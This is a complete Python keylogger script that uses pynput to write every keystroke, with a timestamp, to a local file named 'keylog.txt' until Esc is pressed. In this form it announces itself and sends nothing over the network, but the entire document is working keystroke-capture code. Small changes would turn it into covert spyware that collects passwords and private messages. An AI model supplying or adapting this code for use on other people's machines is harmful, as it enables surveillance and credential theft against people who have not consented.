from pynput import keyboard
import time
import threading

listener_running = True

def on_key_press(key):
    global listener_running
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_file.write(f"{timestamp} - {key}\n")
    
    if key == keyboard.Key.esc:
        listener_running = False
        return False  

def main():
    global listener_running
    print("Press 'Esc' to stop logging.")
    
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    
    while listener_running:
        time.sleep(1)

    listener.stop()
    print("\nLogging stopped...")

if __name__ == "__main__":
    main()


